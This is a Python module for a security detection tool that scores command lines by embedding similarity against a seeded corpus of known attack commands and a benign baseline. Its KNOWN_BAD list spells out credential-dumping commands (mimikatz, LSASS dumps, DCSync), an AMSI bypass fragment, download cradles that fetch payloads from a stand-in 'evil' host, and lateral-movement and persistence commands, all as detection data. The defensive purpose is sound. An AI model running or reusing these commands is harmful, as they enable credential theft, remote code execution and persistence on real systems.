"""FR-4: embedding / similarity layer.

A pluggable, local-first embedding provider plus a small in-process cosine index
over a seeded known-bad corpus and a benign baseline. Produces three NEW signals
that augment (never replace) the deterministic rules (CR-1):

  (a) nearest-neighbour to known-bad  → "looks like a known attack" score
  (b) clustering label                → group similar activity for triage
  (c) novelty                         → distance from the benign baseline

Provider order is local-first (Ollama embeddings, e.g. nomic-embed-text). Cloud
is opt-in only (ALLOW_CLOUD_FALLBACK + key). When no model is reachable we fall
back to a DETERMINISTIC hashed char-n-gram embedding so the feature degrades
gracefully and tests stay hermetic. The vector store holds only numbers + ids
and labels — never raw log text replayed into a prompt (CR-3).
"""
from __future__ import annotations

import hashlib
import logging
import math
import os
from typing import Any, Dict, List, Optional, Tuple

import httpx

from llm_analyzer import _validate_ollama_url, _sanitize_for_prompt
from http_client import get_async_client
import model_governance as gov

logger = logging.getLogger(__name__)

_HASH_DIM = 256
_MAX_EMBED_CHARS = 4096
_EMBED_CACHE_CAP = 2048

# Source-specific "looks like known-bad" thresholds (cosine). Real embeddings
# pack everything closer together than the lexical hash fallback, so the flag
# needs a higher bar. Tune with the FR-4 eval (held-out precision/recall).
SIMILAR_THRESHOLD = {"ollama": 0.62, "openai": 0.62, "hash": 0.30}

# Seed known-bad corpus (label = coarse technique family for clustering).
KNOWN_BAD = [
    ("mimikatz.exe sekurlsa::logonpasswords", "credential-access"),
    ("Invoke-Mimikatz -DumpCreds", "credential-access"),
    ("procdump.exe -ma lsass.exe out.dmp", "credential-access"),
    ("rundll32.exe comsvcs.dll, MiniDump 624 lsass.dmp full", "credential-access"),
    ("lsadump::dcsync /user:krbtgt", "credential-access"),
    ("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')", "defense-evasion"),
    ("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA", "defense-evasion"),
    ("powershell -w hidden -ep bypass -c IEX(New-Object Net.WebClient)", "execution"),
    ("IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')", "download-cradle"),
    ("certutil.exe -urlcache -split -f http://evil/x.exe", "download-cradle"),
    ("bitsadmin /transfer job http://evil/x.exe c:\\x.exe", "download-cradle"),
    ("mshta.exe http://evil/a.hta", "proxy-execution"),
    ("regsvr32 /s /i:http://evil/x.sct scrobj.dll", "proxy-execution"),
    ("rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"", "proxy-execution"),
    ("wmic /node:victim process call create cmd.exe", "lateral-movement"),
    ("psexec \\\\victim -s cmd.exe", "lateral-movement"),
    ("schtasks /create /sc minute /tn evil /tr c:\\m.exe /ru system", "persistence"),
    ("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d c:\\m.exe", "persistence"),
]

# Benign baseline (for novelty). Common admin activity.
BENIGN_BASELINE = [
    "ipconfig /all", "git status", "python3 manage.py runserver", "ping 8.8.8.8",
    "powershell Get-Process", "cmd /c dir C:\\temp", "whoami", "tasklist",
    "net use Z: \\\\fileserver\\share", "curl https://api.internal/health",
    "robocopy C:\\a C:\\b /MIR", "code .", "explorer.exe", "sc query spooler",
    "powershell Get-Service", "reg query HKLM\\Software",
]


def _cosine(a: List[float], b: List[float]) -> float:
    if not a or not b or len(a) != len(b):
        return 0.0
    dot = sum(x * y for x, y in zip(a, b))
    na = math.sqrt(sum(x * x for x in a))
    nb = math.sqrt(sum(y * y for y in b))
    if na == 0 or nb == 0:
        return 0.0
    return dot / (na * nb)


def _hash_embed(text: str, dim: int = _HASH_DIM) -> List[float]:
    """Deterministic hashed char-3-gram embedding (lexical similarity fallback)."""
    vec = [0.0] * dim
    t = (text or "").lower()
    if len(t) < 3:
        t = (t + "   ")[:3]
    for i in range(len(t) - 2):
        gram = t[i:i + 3]
        h = int(hashlib.md5(gram.encode("utf-8")).hexdigest(), 16)
        idx = h % dim
        sign = 1.0 if (h >> 8) & 1 else -1.0
        vec[idx] += sign
    norm = math.sqrt(sum(v * v for v in vec))
    return [v / norm for v in vec] if norm else vec


class EmbeddingProvider:
    """Local-first embedding provider with a deterministic offline fallback."""

    def __init__(self):
        self.ollama_url = _validate_ollama_url(os.getenv("OLLAMA_URL", "http://localhost:11434"))
        self.embed_model = os.getenv("OLLAMA_EMBED_MODEL", "nomic-embed-text")
        self.backend = os.getenv("LLM_BACKEND", "fallback")
        self.allow_cloud_fallback = os.getenv("ALLOW_CLOUD_FALLBACK", "false").lower() == "true"
        self.openai_embed_model = os.getenv("OPENAI_EMBED_MODEL", "text-embedding-3-small")
        self._cache: Dict[str, List[float]] = {}
        self._order: List[str] = []
        self.last_source = "hash"
        self._warned_fallback = False

    def _cache_get(self, key: str) -> Optional[List[float]]:
        return self._cache.get(key)

    def _cache_put(self, key: str, vec: List[float]) -> None:
        if key in self._cache:
            return
        self._cache[key] = vec
        self._order.append(key)
        if len(self._order) > _EMBED_CACHE_CAP:
            self._cache.pop(self._order.pop(0), None)

    async def embed(self, text: str) -> Tuple[List[float], str]:
        """Return (vector, source). source ∈ {ollama, openai, hash}."""
        text = _sanitize_for_prompt(str(text or ""), _MAX_EMBED_CHARS)
        key = hashlib.sha1(text.encode("utf-8", "replace")).hexdigest()
        cached = self._cache_get(key)
        if cached is not None:
            return cached, self.last_source

        vec, source = None, "hash"
        if self.backend in ("ollama", "fallback"):
            try:
                vec = await self._embed_ollama(text)
                source = "ollama"
            except Exception as e:
                if not self._warned_fallback:
                    logger.warning("Ollama embedding unavailable (%r) — using deterministic fallback", e)
                    self._warned_fallback = True
                if self.backend == "fallback" and self.allow_cloud_fallback and os.getenv("OPENAI_API_KEY"):
                    try:
                        vec = await self._embed_openai(text)
                        source = "openai"
                    except Exception as e2:
                        logger.warning("OpenAI embedding failed: %r", e2)
        elif self.backend == "openai" and os.getenv("OPENAI_API_KEY"):
            try:
                vec = await self._embed_openai(text)
                source = "openai"
            except Exception as e:
                logger.warning("OpenAI embedding failed: %r", e)

        if vec is None:
            vec = _hash_embed(text)
            source = "hash"
        self.last_source = source
        self._cache_put(key, vec)
        return vec, source

    async def _embed_ollama(self, text: str) -> List[float]:
        resp = await get_async_client().post(
            f"{self.ollama_url}/api/embeddings", timeout=30.0,
            json={"model": self.embed_model, "prompt": text},
        )
        resp.raise_for_status()
        emb = resp.json().get("embedding")
        if not isinstance(emb, list) or not emb:
            raise ValueError("empty embedding")
        return [float(x) for x in emb]

    async def _embed_openai(self, text: str) -> List[float]:
        resp = await get_async_client().post(
            "https://api.openai.com/v1/embeddings", timeout=30.0,
            headers={"Authorization": f"Bearer {os.getenv('OPENAI_API_KEY','')}",
                     "Content-Type": "application/json"},
            json={"model": self.openai_embed_model, "input": text},
        )
        resp.raise_for_status()
        return [float(x) for x in resp.json()["data"][0]["embedding"]]


class SimilarityIndex:
    """In-process cosine index over the known-bad corpus + benign baseline."""

    def __init__(self, provider: Optional[EmbeddingProvider] = None):
        self.provider = provider or EmbeddingProvider()
        self._bad_vecs: Optional[List[Tuple[str, str, List[float]]]] = None   # (id,label,vec)
        self._benign_vecs: Optional[List[List[float]]] = None
        self._index_source = "hash"

    async def _ensure_index(self) -> None:
        if self._bad_vecs is not None:
            return
        bad = []
        for i, (text, label) in enumerate(KNOWN_BAD):
            vec, src = await self.provider.embed(text)
            self._index_source = src
            bad.append((f"kb_{i}", label, vec))
        benign = []
        for text in BENIGN_BASELINE:
            vec, _ = await self.provider.embed(text)
            benign.append(vec)
        self._bad_vecs = bad
        self._benign_vecs = benign

    async def analyze(self, commandline: str, k: int = 5) -> Dict[str, Any]:
        await self._ensure_index()
        qvec, source = await self.provider.embed(commandline)

        scored = [(cid, label, _cosine(qvec, vec)) for cid, label, vec in self._bad_vecs]
        scored.sort(key=lambda x: x[2], reverse=True)
        neighbors = [{"corpus_id": cid, "label": label, "score": round(s, 4)}
                     for cid, label, s in scored[: max(1, min(int(k), 20))]]
        max_bad = scored[0][2] if scored else 0.0
        threshold = SIMILAR_THRESHOLD.get(source, 0.5)
        similar = max_bad >= threshold
        # Only assign a cluster when the activity actually resembles known-bad.
        cluster_id = scored[0][1] if similar else None

        benign_sims = [_cosine(qvec, bv) for bv in (self._benign_vecs or [])]
        max_benign = max(benign_sims) if benign_sims else 0.0
        novelty = round(1.0 - max_benign, 4)

        return {
            "neighbors": neighbors,
            "max_known_bad_score": round(max_bad, 4),
            "nearest_benign_score": round(max_benign, 4),
            "similar_to_known_bad": similar,
            "threshold": threshold,
            "cluster_id": cluster_id,
            "novelty": novelty,
            "source": source,
            "model_id": (f"ollama/{self.provider.embed_model}" if source == "ollama"
                         else f"openai/{self.provider.openai_embed_model}" if source == "openai"
                         else "hash/char3gram"),
        }
